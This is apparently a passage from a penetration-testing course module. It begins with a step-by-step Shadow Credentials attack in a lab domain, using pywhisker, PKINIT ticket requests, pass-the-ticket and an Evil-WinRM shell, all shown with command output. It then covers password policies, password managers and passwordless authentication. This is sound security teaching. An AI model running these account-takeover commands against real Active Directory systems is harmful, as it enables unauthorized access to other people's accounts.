<h3 id="shadow-credentials-msds-keycredentiallink-">Shadow Credentials (msDS-KeyCredentialLink)</h3>
<p><a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">Shadow Credentials</a> refers to an Active Directory attack that abuses the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c">msDS-KeyCredentialLink</a> attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the <code>AddKeyCredentialLink</code> edge indicates that one user has write permissions over another user&#39;s <code>msDS-KeyCredentialLink</code> attribute, allowing them to take control of that user.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/PtC_2.png" alt="Diagram showing a connection between two users, wwhite@inlanefreight.locall and jpinkman@inlanefreight.locall, labeled &quot;AddKeyCredentialLink.&quot;"></p>
<p>We can use <a href="https://github.com/ShutdownRepo/pywhisker">pywhisker</a> to perform this attack from a Linux system. The command below generates an <code>X.509 certificate</code> and writes the <code>public key</code> to the victim user&#39;s <code>msDS-KeyCredentialLink</code> attribute:</p>
<p>&#x20; Pass the Certificate</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-comment">[/htb]</span>$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

<span class="hljs-comment">[*]</span> Searching for the target account
<span class="hljs-comment">[*]</span> Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
<span class="hljs-comment">[*]</span> Generating certificate
<span class="hljs-comment">[*]</span> Certificate generated
<span class="hljs-comment">[*]</span> Generating KeyCredential
<span class="hljs-comment">[*]</span> KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
<span class="hljs-comment">[*]</span> Updating the msDS-KeyCredentialLink attribute <span class="hljs-keyword">of</span> jpinkman
<span class="hljs-comment">[+]</span> Updated the msDS-KeyCredentialLink attribute <span class="hljs-keyword">of</span> the target object
<span class="hljs-comment">[*]</span> Converting PEM -&gt; PFX with cryptography: eFUVVTPf.pfx
<span class="hljs-comment">[+]</span> PFX exportiert nach: eFUVVTPf.pfx
<span class="hljs-comment">[i]</span> Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
<span class="hljs-comment">[+]</span> Saved PFX (#PKCS12) certificate &amp; key at path: eFUVVTPf.pfx
<span class="hljs-comment">[*]</span> Must be used with password: bmRH4LK7UwPrAOfvIx6W
<span class="hljs-comment">[*]</span> A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
</code></pre>
<p>In the output above, we can see that a <code>PFX (PKCS12)</code> file was created (<code>eFUVVTPf.pfx</code>), and the password is shown. We will use this file with <code>gettgtpkinit.py</code> to acquire a TGT as the victim:</p>
<p>&#x20; Pass the Certificate</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">python3</span> gettgtpkinit.<span class="hljs-keyword">py</span> -cert-pfx ../eFUVVTPf.pfx -pfx-pass <span class="hljs-string">'bmRH4LK7UwPrAOfvIx6W'</span> -dc-ip <span class="hljs-number">10.129</span>.<span class="hljs-number">234.109</span> INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

<span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">04</span>,<span class="hljs-number">728</span> minikerberos INFO     Loading certificate <span class="hljs-built_in">and</span> key from <span class="hljs-keyword">file</span>
INFO:minikerbero<span class="hljs-variable">s:Loading</span> certificate <span class="hljs-built_in">and</span> key from <span class="hljs-keyword">file</span>
<span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">04</span>,<span class="hljs-number">775</span> minikerberos INFO     Requesting TGT
INFO:minikerbero<span class="hljs-variable">s:Requesting</span> TGT
<span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">04</span>,<span class="hljs-number">929</span> minikerberos INFO     AS-REP encryption key (you might need this <span class="hljs-keyword">later</span>):
INFO:minikerbero<span class="hljs-variable">s:AS</span>-REP encryption key (you might need this <span class="hljs-keyword">later</span>):
<span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">04</span>,<span class="hljs-number">929</span> minikerberos INFO     f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
INFO:minikerbero<span class="hljs-variable">s:f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8</span>
<span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">04</span>,<span class="hljs-number">937</span> minikerberos INFO     Saved TGT <span class="hljs-keyword">to</span> <span class="hljs-keyword">file</span>
INFO:minikerbero<span class="hljs-variable">s:Saved</span> TGT <span class="hljs-keyword">to</span> <span class="hljs-keyword">file</span>
</code></pre>
<p>With the TGT obtained, we may once again <code>pass the ticket</code>:</p>
<p>&#x20; Pass the Certificate</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ export KRB5CCNAME=/</span>tmp/jpinkman.ccache
root<span class="hljs-meta">@htb</span>[/htb]$ klist

Ticket <span class="hljs-string">cache:</span> <span class="hljs-string">FILE:</span><span class="hljs-regexp">/tmp/</span>jpinkman.ccache
Default <span class="hljs-string">principal:</span> jpinkman<span class="hljs-meta">@INLANEFREIGHT</span>.LOCAL

Valid starting       Expires              Service principal
<span class="hljs-number">04</span><span class="hljs-regexp">/28/</span><span class="hljs-number">2025</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">04</span>  <span class="hljs-number">04</span><span class="hljs-regexp">/29/</span><span class="hljs-number">2025</span> <span class="hljs-number">06</span>:<span class="hljs-number">50</span>:<span class="hljs-number">04</span>  krbtgt/INLANEFREIGHT.LOCAL<span class="hljs-meta">@INLANEFREIGHT</span>.LOCAL
</code></pre>
<p>In this case, we discovered that the victim user is a member of the <code>Remote Management Users</code> group, which permits them to connect to the machine via <code>WinRM</code>. As demonstrated in the previous section, we can use <code>Evil-WinRM</code> to connect using Kerberos (note: ensure that <code>krb5.conf</code> is properly configured):</p>
<p>&#x20; Pass the Certificate</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local

Evil-WinRM shell v3.<span class="hljs-number">7</span>

Warning: Remote path completions <span class="hljs-keyword">is</span> disabled due <span class="hljs-keyword">to</span> ruby limitation: undefined <span class="hljs-function"><span class="hljs-keyword">method</span> `<span class="hljs-title">quoting_detection_proc</span>' <span class="hljs-title">for</span> <span class="hljs-title">module</span> <span class="hljs-title">Reline</span>

<span class="hljs-title">Data</span>:</span> <span class="hljs-keyword">For</span> more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span>

Info: Establishing connection <span class="hljs-keyword">to</span> remote endpoint
*Evil-WinRM* PS C:\Users\jpinkman\Documents&gt; whoami
inlanefreight\jpinkman
</code></pre>
<h3 id="no-pkinit-">No PKINIT?</h3>
<p>In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool <a href="https://github.com/AlmondOffSec/PassTheCert/">PassTheCert</a> was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing passwords or granting DCSync rights). This attack is outside the scope of this module but is worth reading about <a href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html">here</a>.</p>
<hr>
<h2 id="password-policies">Password Policies</h2>
<p>Now that we have worked through numerous ways to capture credentials and passwords, let us turn our attention to best practices for password and identity protection. Speed limits and traffic laws exist so that we drive safely. Without them, driving would be chaotic. The same is true when a company does not have proper policies in place; users could act without constraints regardless of the consequences. This is why service providers and administrators define and enforce policies for better security.</p>
<p>Let us meet Mark, a new employee at Inlanefreight Corp. Mark does not work in IT and is not aware of the risks associated with weak passwords. When prompted to set his business email password, he chooses <code>password123</code>. However, he receives an error stating that the password does not meet the company&#39;s password policy, along with a message explaining the minimum requirements for a more secure password.</p>
<p>In this example, we have two major components: the definition of the password policy and its enforcement. The definition outlines the rules and expectations for password creation, while enforcement is the technology use to enforce compliance. Both are essential aspects to a successful password policy implementation. In this lesson, we will explore how to create a strong password policy and how to enforce it effectively.</p>
<h3 id="password-policy">Password policy</h3>
<p>A <a href="https://en.wikipedia.org/wiki/Password_policy">password policy</a> is a set of rules designed to enhance computer security by encouraging users to create strong passwords and use them appropriately according to the organization&#39;s standards. The scope of a password policy extends beyond minimum password requirements to encompass the entire password lifecycle (such as creation, storage, management, and transmission).</p>
<p><strong>Password policy standards</strong></p>
<p>Due to compliance requirements and best practices, many companies follow established <a href="https://en.wikipedia.org/wiki/IT_security_standards">IT security standards</a>. While adhering to these standards does not guarantee complete security, it is a widely accepted industry practice that defines a baseline for security controls with an organization. However, compliance alone should not be the sole measure of an organization&#39;s security controls.</p>
<p>Some security standards include sections on password policies or guidelines. Here are a few of the most common:</p>
<ul>
<li><a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf">NIST SP800-63B</a></li>
<li><a href="https://www.cisecurity.org/insights/white-papers/cis-password-policy-guide">CIS Password Policy Guide</a></li>
<li><a href="https://www.pcisecuritystandards.org/document_library?category=pcidss\&amp;document=pci_dss">PCI DSS</a></li>
</ul>
<p>These standards offer different perspectives on password security. We can study them to help shape our own password policy. Let&#39;s examine a use-case where standards differ significantly: <code>password expiration</code>.</p>
<p>In the past, we may have heard phrases such as <code>&quot;change your password every 90 days to stay secure.&quot;</code> The truth is that not every organization follows this—some only required password changes in the event of a confirmed compromise. Today, the industry has shifted to recommending that password expiration be disabled, as it often leads users to adopt predictable, weak patterns.</p>
<p><strong>Sample password policy</strong></p>
<p>To illustrate important considerations, here is a sample password policy. It requires that all passwords:</p>
<ul>
<li>Minimum of 8 characters.</li>
<li>Include uppercase and lowercase letters.</li>
<li>Include at least one number.</li>
<li>Include at least one special character.</li>
<li>It should not be the username.</li>
<li>It should be changed every 60 days.</li>
</ul>
<p>Our new employee, Mark, who initially received an error when trying to set his email password to <code>password123</code>, now chooses <code>Inlanefreight01!</code> and successfully registers his account. While this password meets the company&#39;s policy requirements, it is still weak and easily guessable, as it includes the company name. We learned in the &quot;Password Mutations&quot; section that this is a common practice of employees, and attackers are aware of this.</p>
<p>Once the password reaches its expiration, Mark can simply change <code>01</code> to <code>02</code>, and the new password still complies with the company&#39;s policy despite being nearly identical to the previous one. For this reason, there is ongoing debate among security professionals about the effectiveness of password expiration policies and when users should be required to change their passwords.</p>
<p>Based on this example, we should include certain blacklisted words in our password policies. These may include, but are not limited to:</p>
<ul>
<li>The company&#39;s name</li>
<li>Common words associated with the company</li>
<li>Names of months</li>
<li>Names of seasons</li>
<li>Variations on the words &quot;welcome&quot; and &quot;password&quot;</li>
<li>Common and easily guessable words such as &quot;password&quot;, &quot;123456&quot;, and &quot;abcde&quot;</li>
</ul>
<h3 id="enforcing-password-policy">Enforcing password policy</h3>
<p>A password policy is a set of guidelines for how passwords should be created, managed, and stored within an organization. To implement this policy effectively, it must be enforced using the technology at our disposal or by acquiring the necessary tools. Most applications and identity management systems offer features to support the enforcement of such policies.</p>
<p>For instance, if we use Active Directory for authentication, we can configure an <a href="https://activedirectorypro.com/how-to-configure-a-domain-password-policy/">Active Directory Password Policy GPO</a> to ensure users comply with our policy.</p>
<p>Once the technical aspect is covered, the policy must be communicated to the rest of the company. Subsequently, processes and procedures should be created to guarantee that the password policy is applied everywhere.</p>
<h3 id="creating-a-strong-password">Creating a strong password</h3>
<p>Creating a strong password doesn&#39;t have to be difficult. Tools like <a href="https://www.passwordmonster.com/">PasswordMonster</a> help evaluate the strength of passwords, while <a href="https://1password.com/password-generator/">1Password Password Generator</a> can generate secure ones.</p>
<p>![Password test showing &quot;CjDC2x[U&quot; rated as very strong. Contains lowercase, uppercase, numbers, symbols. Estimated crack time: 1 thousand years.](<a href="https://academy.hackthebox.com/storage/modules/308/img/strong_password_1.png">https://academy.hackthebox.com/storage/modules/308/img/strong_password_1.png</a>)</p>
<p>The password <code>CjDC2x[U</code> was generated by the tool and is considered strong. It would take a long time to crack and is unlikely to be guessed or exposed via password spraying attacks. However, it may be difficult to remember.</p>
<p>We can create strong passwords using ordinary words, phrases, or even lyrics from songs we like. For example, a good password might be <code>This is my secure password</code> or <code>The name of my dog is Popy</code>. To make these phrases more complex, we can add special characters, such as <code>()The name of my dog is Popy!</code>. While such passwords are difficult to guess, we should keep in mind that attackers can use OSINT to learn about us, and we should keep this in mind when creating passwords.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/strong_password_phrase.png" alt="Password test showing &#39;The name of my dog is Popy&#39; rated as very strong, estimated crack time 381 trillion years."></p>
<p>Using this method, we can create and remember several strong passwords. However, as the number grows, it becomes increasingly difficult to manage them all. In the next section, we will explore how using a password manager can help generate and securely store a large number of passwords.</p>
<hr>
<h2 id="password-managers">Password Managers</h2>
<p>It seems like everything requires a password nowadays. We use them for home Wi-Fi, social networks, bank accounts, business emails, and our favorite applications and websites. According to a <a href="https://www.techradar.com/news/most-people-have-25-more-passwords-than-at-the-start-of-the-pandemic">study conducted by NordPass</a>, the average person now has around 100 passwords. This is one of the main reasons people often reuse passwords or create overly simple ones.</p>
<p>Given this reality, we need to have strong, unique passwords for each service. Yet, it is unrealistic to expect anyone to memorize hundreds of complex credentials. This is where a <a href="https://en.wikipedia.org/wiki/Password_manager">password manager</a> becomes essential. A password manager is an application that securely stores passwords and sensitive information in an encrypted database. In addition to keeping data safe, password managers offer features such as password generation, two-factor authentication (2FA) support, secure form filling, browser integration, multi-device synchronization, security alerts, and more.</p>
<h3 id="how-does-a-password-manager-work-">How does a password manager work?</h3>
<p>The implementation of password managers varies by provider, but most operate using a master password to encrypt the password database.</p>
<p>The Encryption and authentication rely on us <a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function">cryptographic hash functions</a> and <a href="https://en.wikipedia.org/wiki/Key_derivation_function">key derivation functions</a> to prevent unauthorized access to the encrypted database and its content. The specific mechanisms used depend on the provider and whether the password manager is cloud-based or locally stored.</p>
<p>Let&#39;s break down some common password managers and how they work.</p>
<h3 id="cloud-password-managers">Cloud password managers</h3>
<p>One of the key considerations when choosing a password manager is convenience. The average person owns three or four devices and uses them to log into different websites and applications. A cloud-based password manager allows users to synchronize their encrypted password database across multiple devices. Most of them provide:</p>
<ul>
<li>A mobile application.</li>
<li>A browser add-on.</li>
<li>Some other features that we&#39;ll discuss later in this section.</li>
</ul>
<p>Each password manager vendor implements security in their own way, and usually provide a technical document detailing how their system works. You can refer to the whitepapers from <a href="https://bitwarden.com/images/resources/security-white-paper-download.pdf">Bitwarden</a>, <a href="https://1passwordstatic.com/files/security/1password-white-paper.pdf">1Password</a>, and <a href="https://assets.cdngetgo.com/da/ce/d211c1074dea84e06cad6f2c8b8e/lastpass-technical-whitepaper.pdf">LastPass</a> as examples (though many others exist). Let&#39;s take a look at how these systems generally work.</p>
<p>A common implementation for cloud password managers involves deriving encryption keys from the master password. This approach supports <a href="https://blog.cubbit.io/blog-posts/what-is-zero-knowledge-encryption">Zero-Knowledge Encryption</a>, which ensures that no one, not even the service provider, can access your secured data. To illustrate this, let&#39;s examine Bitwarden&#39;s approach to password derivation:</p>
<ul>
<li><code>Master key</code>: Derived from the master password using a key derivation function.</li>
<li><code>Master password hash</code>: Generated using the master password (and often the master key) to authenticate the user to the cloud service.</li>
<li><code>Decryption key</code>: Created using the master key to form a symmetric key, which is then used to decrypt vault items.</li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/bitwarden_diagram.png" alt="Bitwarden encryption process diagram showing user login, PBKDF2-SHA256 algorithm, master key derivation, and AES-256 bit decryption for vault access."></p>
<p>This is a simplified explanation of how password managers operate. In practice, the implementation is more complex. For deeper insight, refer to the technical documents linked above or watch the <a href="https://www.youtube.com/watch?v=w68BBPDAWr8">How Password Managers Work – Computerphile</a> video.</p>
<p>Some of the most popular cloud password managers are:</p>
<ul>
<li><a href="https://1password.com/">1Password</a></li>
<li><a href="https://bitwarden.com/">Bitwarden</a></li>
<li><a href="https://www.dashlane.com/">Dashlane</a></li>
<li><a href="https://www.keepersecurity.com/">Keeper</a></li>
<li><a href="https://www.lastpass.com/">Lastpass</a></li>
<li><a href="https://nordpass.com/">NordPass</a></li>
<li><a href="https://www.roboform.com/">RoboForm</a></li>
</ul>
<h3 id="local-password-managers">Local password managers</h3>
<p>Some companies and individuals prefer to manage their own security for various reasons, opting not to rely on third-party services. Local password managers provide this option by storing the password database locally and placing the responsibility on the user to protect its content and storage location. <a href="https://www.dashlane.com/">Dashlane</a> published a blog post, <a href="https://blog.dashlane.com/password-storage-cloud-versus-local/">Password Manager Storage: Cloud vs. Local</a>, which explores the pros and cons of each approach. As the blog states, &quot;At first it might seem like this makes local storage more secure than cloud storage, but cybersecurity is not a simple discipline.&quot; This post serves as a useful starting point for understanding which method may better suit different password management scenarios.</p>
<p>Local password managers use encryption methods similar to those of cloud-based implementations. The most notable difference lies in data transmission and authentication. To encrypt the database, local password managers focus on securing the database stored on the local system, using various cryptographic hash functions (depending on the manufacturer). They also employ key derivation functions with random salt to prevent precomputed keys and to hinder dictionary and guessing attacks. Some offer additional protections such as memory protection and keylogger resistance, using a secure desktop environment similar to Windows User Account Control (UAC).</p>
<p>Some of the most widely used local password managers are:</p>
<ul>
<li><a href="https://keepass.info/">KeePass</a></li>
<li><a href="https://apps.kde.org/kwalletmanager5/">KWalletManager</a></li>
<li><a href="https://pleasantpasswords.com/">Pleasant Password Server</a></li>
<li><a href="https://pwsafe.org/">Password Safe</a></li>
</ul>
<h3 id="features">Features</h3>
<p>Let&#39;s imagine we use Linux, Android, and Chrome OS. We access our applications and websites from multiple devices and want to synchronize all passwords and secure notes across them. We also need extra protection through 2FA, and our budget is $5 per month. This information can help us identify the most suitable password manager for our needs.</p>
<p>When choosing between a cloud or local password manager, it&#39;s important to understand the available features. <a href="https://en.wikipedia.org/wiki/List_of_password_managers">Wikipedia</a> offers a helpful list of both online and offline password managers, along with their key capabilities. Here are some of the most common features:</p>
<ul>
<li><a href="https://authy.com/what-is-2fa/">2FA</a> support.</li>
<li>Multi-platform (Android, iOS, Windows, Linux, Mac, etc.).</li>
<li>Browser Extension.</li>
<li>Login Autocomplete.</li>
<li>Import and export capabilities.</li>
<li>Password generation.</li>
</ul>
<h3 id="alternatives">Alternatives</h3>
<p>Passwords are the most common form of authentication, but not the only one. As we&#39;ve seen throughout this module, passwords can be compromised in many ways: cracking, guessing, shoulder surfing, and more. But what if we didn&#39;t need passwords at all? Is that even possible?</p>
<p>By default, most operating systems and applications are built around password based authentication. However, administrators can adopt third-party identity providers or applicationss to enhance identity protection. Some of the most common alternatives include:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Multi-factor_authentication">Multi-factor Authentication (MFA)</a></li>
<li><a href="https://fidoalliance.org/fido2/">FIDO2</a>, an open authentication standard that enables passwordless logins using physical devices like <a href="https://www.yubico.com/">YubiKey</a>. For a broader list of devices, see <a href="https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-authentication-passwordless#fido2-security-key-providers">Microsoft’s supported FIDO2 providers</a>.</li>
<li><a href="https://en.wikipedia.org/wiki/One-time_password">One-Time Passwords (OTP)</a></li>
<li><a href="https://en.wikipedia.org/wiki/Time-based_one-time_password">Time-Based One-Time Passwords (TOTP)</a></li>
<li><a href="https://news.gandi.net/en/2019/05/using-ip-restriction-to-help-secure-your-account">IP restrictions</a></li>
<li>Device compliance enforcement via tools like <a href="https://www.petervanderwoude.nl/post/tag/device-compliance/">Microsoft Endpoint Manager</a> or <a href="https://www.loginconsultants.com/enabling-the-device-compliance-with-workspace-one-uem-authentication-policy-in-workspace-one-access">Workspace ONE</a></li>
</ul>
<h3 id="going-passwordless">Going passwordless</h3>
<p>Many companies—including <a href="https://www.microsoft.com/en-us">Microsoft</a>, <a href="https://auth0.com/">Auth0</a>, <a href="https://www.okta.com/">Okta</a>, and <a href="https://www.pingidentity.com/en.html">Ping Identity</a>—are advocating for a <a href="https://en.wikipedia.org/wiki/Passwordless_authentication">passwordless</a> future. This strategy aims to remove passwords as an authentication method altogether.</p>
<p><a href="https://www.pingidentity.com/en/resources/blog/posts/2021/what-does-passwordless-really-mean.html">Passwordless</a> authentication is achieved when an authentication factor other than a password is used. A password is a knowledge factor, meaning it&#39;s something a user knows. The problem with relying on a knowledge factor alone is that it&#39;s vulnerable to theft, sharing, repeat use, misuse, and other risks. Passwordless authentication ultimately means no more passwords. Instead, it relies on a possession factor (something a user has) or an inherent factor (something a user is) to verify user identity with greater assurance.</p>
<p>As new technology and standards evolve, we need to investigate and understand the details of their implementation to determine whether those alternatives will provide the security we need for the authentication process. You can read more about Passwordless authentication and different vendor strategies:</p>
<ul>
<li><a href="https://www.microsoft.com/en-us/security/business/identity-access-management/passwordless-authentication">Microsoft Passwordless</a></li>
<li><a href="https://auth0.com/passwordless">Auth0 Passwordless</a></li>
<li><a href="https://www.okta.com/passwordless-authentication/">Okta Passwordless</a></li>
<li><a href="https://www.pingidentity.com/en/resources/blog/posts/2021/what-does-passwordless-really-mean.html">PingIdentity</a></li>
</ul>
<p>There are many options available for protecting passwords. Choosing the right one depends on the specific needs of the individual or organization. It is common for both people and companies to use different password protection methods for different purposes.</p>
<hr>
